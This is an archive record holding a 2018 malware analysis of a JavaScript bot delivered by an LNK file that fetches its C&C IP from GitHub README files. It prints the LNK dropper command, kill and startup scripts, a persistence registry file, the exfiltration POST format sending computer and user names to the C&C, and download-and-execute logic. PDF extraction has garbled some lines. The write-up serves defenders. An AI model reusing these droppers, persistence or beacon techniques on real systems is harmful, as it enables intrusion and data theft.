{
    "id": "2e3b7a8d-c4a6-40af-a756-5d10cd0ba6b9",
    "created_at": "2023-01-12T15:05:17.631055Z",
    "updated_at": "2025-03-27T02:05:46.322471Z",
    "deleted_at": null,
    "sha1_hash": "f45fdc90ce679432628bc676dd180f0ab45eb0cd",
    "title": "2018-05-24 - JavaScript based Bot using Github C&C",
    "authors": "",
    "file_creation_date": "2022-05-27T22:07:25Z",
    "file_modification_date": "2022-05-27T22:07:25Z",
    "file_size": 154348,
    "plain_text": "# JavaScript based Bot using Github C&C\n\n**pwncode.io/2018/05/javascript-based-bot-using-github-c.html**\n\nAn LNK file was discovered in the wild recently on 22nd May 2018 which used an interesting mechanism for C&C communication leveraging\ngithub and used a new JavaScript based Bot for performing malicious activities on the system.\n\n**MD5 hash of the ZIP file: f444bfe1e65b5e2bef8984c740bd0a49**\n\n**MD5 hash of the LNK file: 219dedb53da6b1dce0d6c071af59b45c**\n\n**Filename: 200_Germany.lnk**\n\nConfig File details are mentioned at the end of the article.\n\nThe Target of the LNK file is as shown below:\n\n**%comspec% /c copy 2*.lnk %tmp%&%systemdrive%&cd %tmp%&attrib +r *.lnk&for /f \"delims=\" %a in ('dir /s /b *.LnK') do type**\n**\"%~fa\" | find \"p0b2x6\">.js &CsCRipt .js \"%~fa\"**\n\nThis LNK file contains a malicious JavaScript inside it which will be dropped and executed using cscript.\n\nThe JavaScript is as shown below:\n\n**Figure 1**\nIt also contains a decoy CSV file which will be displayed to the end user after execution.\n\nThe LNK file first searches for all the lines containing the marker \"p0b2x6\" inside it. Each of these lines correspond to the JavaScript which will\nbe used to perform further malicious activities.\n\n**Analysis of the JavaScript file**\n\nBelow are the main functions performed by the JavaScript file:\n\n1. Collects information about the AV software running on the machine using the following WMI query:\n\nSELECT displayName FROM AntiVirusProduct\n\n2. Collects information about the version of the OS by running the WMI query:\n\nSELECT * FROM Win32_OperatingSystem\n\n3. The decoy contents will be extracted from the LNK file and dropped on the file system with the filename: 200_Germany.csv. This is the\ndecoy file which will be displayed to the user as shown below:\n\n**Figure 2**\n4. It creates the storage directory in the path: %localappdata%\\Microsoft\\PackageCache\\{37B8F9C7-03FB-3253-8781-2517C99D7C00}\"\n\nIt is important to note that the environment variable, %localappdata% is present only on Windows 7 and above.\n\n5 It creates a kill js file in the Storage directory with the following contents:\n\n\n-----\n\na o S c GetObject( g ts \\\\\\\\ \\\\ oot\\\\c ); e( ){ Sc pt S eep( 80000); c oc ();} u ct o c oc () {t y { a co oc st\n= oWMISrvc.ExecQuery(\"SELECT * FROM Win32_Process WHERE CommandLine LIKE '%-Embedding%' AND Name = 'iexplore.exe'\");var\nobjItem = new Enumerator(colProcLst);for(;!objItem.atEnd();objItem.moveNext()) {var p = objItem.item();p.Terminate();}} catch (e) {}}\n\nThe purpose of this JS file is to kill any running instances of Internet Explorer which have the command line parameter matching: \"Embedding\". The reason to do this is because InternetExplorer.Application ActiveX Object is used by the JavaScript to perform the C&C\ncommunication.\n\n6. Creates a startup.js file in the storage directory with the following contents:\n\nvar WshShell = new ActiveXObject(\"WScript.Shell\");\nWshShell.Run(\"C:\\\\Windows\\\\System32\\\\cscript.exe %localappdata%\\\\Microsoft\\\\PackageCache\\\\{37B8F9C7-03FB-3253-87812517C99D7C00}\\\\file.js\", 0, 0);\n\nThe purpose of this file is to execute the main malicious JavaScript file.\n\n7. Copies the main JavaScript file to the storage directory with the filename: file.js\n\n8. Executes the main JavaScript, file.js\n\n9. Deletes the original instance of the JavaScript.\n\nThe following actions are performed when the main JavaScript is executed from the storage directory.\n\n10. Creates an lck file, h.lck in the storage directory.\n\n11. Kills any running instance of iexplore.exe as described in the step 5 above.\n\n12. Creates a Windows Registry file, g3r.reg in the storage directory with the following information:\n\nWindows Registry Editor Version 5.00\n\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows]\n\"run\"=\"%localappdata%\\\\Microsoft\\\\PackageCache\\\\{37B8F9C7-03FB-3253-8781-2517C99D7C00}\\\\services.lnk\"\n\n[HKEY_CURRENT_USER\\Control Panel\\Cursors]\n\"AppStarting\"=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,74,00,25,00,5c,00,63,00,75,00,72,00,73,00,6f,00,72,00,73,00,5\n\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main]\n\"Check_Associations\"=\"no\"\n\"NoProtectedModeBanner\"=dword:00000001\n\"IE10RunOncePerInstallCompleted\"=dword:00000001\n\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Recovery]\n\"AutoRecover\"=dword:00000002\n\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\PhishingFilter]\n\"EnabledV9\"=dword:00000001\n\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\BrowserEmulation]\n\"MSCompatibilityMode\"=dword:00000001\n\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced]\n\"EnableBalloonTips\"=dword:00000000\n\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings]\n\"GlobalUserOffline\"=dword:00000000\n\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3]\n\"2500\"=dword:00000003\n\n[HKEY_CURRENT_USER\\Software\\Piriform\\CCleaner]\n\"BrowserMonitoring\"=\"(Mon)3001\"=\nThis registry file is executed using: reg import command and it results in the creation of the Persistence Registry key which points to\nservice.lnk file dropped in the Storage Directory.\n\n13. Creates a Shortcut, LNK file with the name, service.lnk in the Storage Directory whose target points to startup.js in the storage directory.\n\n**C&C Communication**\n\n\n-----\n\nThe most interesting part in this sample was the C&C Communication. The C&C Server address is retrieved from github as shown below:\n\nJavaScript calls the extract_srvaddr() function which performs the following main actions:\n\n1. Connects to the following github URLs:\n\nhttps://raw.githubusercontent.com/deadpooool/news/master/README.md\nhttps://raw.githubusercontent.com/anvaperhdfjkdhud/1234/master/README.md\n\nLooks for the pattern: \"our news start at (.*) thank you\"\n\nPlease refer the screenshot below:\n\n**Figure 3**\n2. Once it finds the above pattern, it extracts the number. In our case, the number is: 2077937692956. This number is the decimal\nrepresentation of the C&C IP Address: 185.247.211.198.\n\n3. It calls the function, num2dot() to convert the above number to an IP address.\n\n4. Validation of the C&C Server: It uses an interesting method to verify whether the C&C Server is indeed the actual intended server and not\nan analysis server. To do this, it constructs the following URL:\n\nhttp://<C&C_server>/Validate/ValSrv\n\nIt connects to the above URL and looks for the string: youwillnotfindthisanywhare.\n\nPlease refer the screenshot below.\n\n**Figure 4**\nIf this string is found in the HTML response, then it continues with the execution.\n\n**Data Exfiltration and C&C Commands**\n\nThe communication between the JavaScript based bot and the C&C Server takes place using an instance of InternetExplorer.Application\nActiveXObject.\n\nThe function, get_page_content_with_ie() is used to send GET and POST requests to the C&C Server.\n\nThe main requests sent are as shown below:\n\n**getid: Sends an HTTP POST request to the URL: hxxp://185.247.211.198//Validate/getid with the following data:**\n\n**action=getSerial&computer_name=<computer_name>&username=<username>&version=1.3&cli=bd**\n\nIn response, the C&C Server will return the ID as shown below:\n\n1312433611441862\n\n**getcommand: It retrieves the commands from the C&C Server by sending an HTTP POST request to the URL:**\n**hxxp://185.247.211.198/Validate/getcommand and sending the following data:**\n\n**action=getCommand&uid=<id>**\n\nThe Server responds with the following data:\n\n**{'command':'','timeout':'5','interpreter':''}**\n\nAt the time of verification, the C&C Server was not responding with a command.\n\nHowever, based on the static analysis of the JavaScript, it will perform the following actions on the command:\n\n\n-----\n\na ses t e co a d sea c g o t e ey o d do oad\n2. If it finds the keyword, \"download\", then it splits the value using the delimiter, \"|\"\n3. Sends an HTTP GET request to the URL: hxxp://185.247.211.198/Validate/dwnld?u=<value> to fetch the response\n4. If the response is a binary, then the file will be dropped and executed.\n5. Otherwise the command will be executed directly using cmd.exe\n\n**Config File**\n\nURLs:\n\n['https://raw.githubusercontent.com/deadpooool/news/master/README.md','https://raw.githubusercontent.com/anvaperhdfjkdhud/1234/master/REA\nversion = \"1.3\"\nref = \"bd\"\nStorageDir = WshShell.ExpandEnvironmentStrings(\"%localappdata%\")+\"\\\\Microsoft\\\\PackageCache\\\\{37B8F9C7-03FB-3253-87812517C99D7C00}\";\nstartup_shortcut = services.lnk\nagent_location = file.js\nagent_hidden_executer = startup.js\ng3r = g3r.reg\nagent_id_location = id\nlckFile = h.lck\nieFile = kill.js\nsctFile = SC7.P7D\npyFile = main.py c0d3inj3cT\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-05-24 - JavaScript based Bot using Github C&C.pdf"
    ],
    "report_names": [
        "2018-05-24 - JavaScript based Bot using Github C&C.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535917,
    "ts_updated_at": 1743041146,
    "ts_creation_date": 1653689245,
    "ts_modification_date": 1653689245,
    "files": {
        "pdf": "https://archive.orkl.eu/f45fdc90ce679432628bc676dd180f0ab45eb0cd.pdf",
        "text": "https://archive.orkl.eu/f45fdc90ce679432628bc676dd180f0ab45eb0cd.txt",
        "img": "https://archive.orkl.eu/f45fdc90ce679432628bc676dd180f0ab45eb0cd.jpg"
    }
}